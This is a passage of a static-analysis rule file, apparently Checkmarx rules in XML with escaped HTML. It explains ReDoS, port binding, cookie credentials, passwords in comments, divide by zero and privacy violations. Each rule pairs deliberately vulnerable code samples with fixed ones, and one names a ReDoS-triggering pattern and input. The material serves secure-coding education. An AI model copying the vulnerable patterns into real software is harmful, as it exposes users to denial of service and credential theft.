&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_640</key><name>ReDoS_From_Regex_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_616</key><name>Potential_ReDoS_In_Static_Field</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_641</key><name>ReDoS_In_Match</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_642</key><name>ReDoS_In_Pattern</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_643</key><name>ReDoS_In_Replace</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1673</key><name>Multiple_Binds_to_the_Same_Port</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If two sockets are bound to the same port, this may lead to confusion and result in unexpected behavior. If this occurs because of user provided inputs, an attacker may bind an unexpected interface, hijacking the connection, the contents of the session created and any sensitive information broadcast during that session.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;A dynamically allocated interface on the same port is being created by application code.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Avoid using variable interface names when binding ports; use constants or configurations to bind the appropriate ports instead. Specifically - never rely on user inputs for the purpose of binding a port to avoid hijacking.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Dynamically Defined Socket&lt;/h4&gt;&lt;pre&gt; public static void makeSocket(String iface) throws IOException {
	 ServerSocket ss = new ServerSocket();
	 ss.bind(new InetSocketAddress(iface, 2020));
     // Do something
     ss.close();
 }&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3089</key><name>Cookie_Overly_Broad_Path</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker with access to the user's desktop, or unprotected network connection, could steal the user's password and other sensitive data stored in the cookie. Once the password is stolen, the attacker can impersonate her victim to the application, and do anything the user can do. The application would not be able to discern the difference, since the user's own password was used.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application sends sensitive user data, including passwords, back to the user's browser embedded in a cookie. Persistent cookies are stored in a file on the user's computer, where they might be accessed by an unauthorized user, thus exposing the user's password.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Do not store passwords, or any other secret data besides sessionid, in cookies.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Storing user credentials in cookie&lt;/h4&gt;&lt;pre&gt;public bool LoginUser(string username, string password)
{
    bool isValid = false;

    if (Authenticate(username, password))
    {
        isValid = true; 
        
        HttpCookie cookie = new HttpCookie("credentials", 
                                            username + ":" + password);
        cookie.Expires = DateTime.Now.AddDays(30);
        
        Response.Cookies.Add(cookie);
    }
    
    return isValid;
}&lt;/pre&gt;&lt;h4&gt;Use a GUID instead of credentials&lt;/h4&gt;&lt;pre&gt;public bool LoginUser(string username, string password)
{
    bool isValid = false;

    if (Authenticate(username, password))
    {
        isValid = true; 
        
        Guid id = Guid.NewGuid(); 
        SaveUserGuidToDB(username, id); 
        
        HttpCookie cookie = new HttpCookie("id", id.ToString());
        cookie.Expires = DateTime.Now;
        cookie.Secure = true;
        cookie.HttpOnly = true;
        
        Response.Cookies.Add(cookie);
    }
    
    return isValid;
}&lt;/pre&gt;&lt;h4&gt;Using FormsAuthentication Class&lt;/h4&gt;&lt;pre&gt;public bool LoginUser(string username, string password)
{
    bool isValid = false;

    if (Authenticate(username, password))
    {
        isValid = true; 
        FormsAuthentication.SetAuthCookie(username, false);
    }
    
    return isValid;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4448</key><name>Password_In_Comment</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;It is often possible to&amp;#160;retrieve and view the application source code.&amp;#160;For web applications, it is even simpler to "&lt;code&gt;View Source&lt;/code&gt;" in the user's browser. Thus, a malicious user can steal these passwords, and use them to impersonate whoever they belong to. It is not known if these are valid, current passwords, nor if they are user passwords or for backend systems, like a database.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;A well-developed application will have it's source code well commented. Often, programmers&amp;#160;will&amp;#160;leave deployment information in comments, or&amp;#160;retain debugging data that was used during development. These comments often contain secret data, such as passwords. These password comments are stored in the source code in perpetuity, and are not protected.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Do not store secrets, such as passwords, in source code comments.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;Old code retained in comment with password&lt;/h4&gt;&lt;pre&gt;
function login() {
    // send credentials to server instead of reading from database
    // constring = "Initial Catalog=mytest;User Id=sa;Pwd=mypass;";
    var creds = "username=" + txtUsername.text + "&amp;password=" + txtPassword.text;
    
    var resp = sendToServer("/login", creds);
    return (resp == "success");
}&lt;/pre&gt;&lt;h4&gt;Passwords Cleaned from Comments&lt;/h4&gt;&lt;pre&gt;function login() {
    // send credentials to server instead of reading from database
    var creds = "username=" + txtUsername.text + "&amp;password=" + txtPassword.text;
    
    var resp = sendToServer("/login", creds);
    return (resp == "success");
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1641</key><name>Divide_By_Zero</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;When a program divides a number by zero, an exception will be raised. If this exception is not handled by the application, unexpected results may occur, including crashing the application. This can be considered a DoS (Denial of Service) attack, if an external user has control of the value of the denominator or can cause this error to occur.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The program receives an unexpected value, and uses it for division without filtering, validation, or verifying that the value is not zero. The application&amp;nbsp;does not explicitly handle this error or prevent division by zero from occuring.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Before dividing by an unknown value, validate the number and explicitly ensure it does not evaluate to zero.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Validate all untrusted input from all sources, in particular verifying that it is not zero before dividing with it.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Verify output of methods, calculations, dictionary lookups, and so on, and ensure it is not zero before dividing with the result.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure divide-by-zero errors are caught and handled appropriately.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Divide by Zero&lt;/h4&gt;&lt;pre&gt;public float getAverage(HttpServletRequest req) {
	int total = Integer.parseInt(req.getParameter("total"));
  	int count = Integer.parseInt(req.getParameter("count")); 
  
  	return total / count;
}&lt;/pre&gt;&lt;h4&gt;Checked Division&lt;/h4&gt;&lt;pre&gt;public float getAverage(HttpServletRequest req) {
	int total = Integer.parseInt(req.getParameter("total"));
  	int count = Integer.parseInt(req.getParameter("count")); 
  
  	if (count &gt; 0)
  		return total / count;
  	else 
      	return 0;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_639</key><name>Privacy_Violation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;A user&amp;#8217;s personal information could be stolen by a malicious programmer, or an attacker that intercepts the data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application sends user information, such as passwords, account information, or credit card numbers, outside the application, such as writing it to a local text or log file or sending it to an external web service.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Personal data should be removed before writing to logs or other files.&lt;/li&gt;
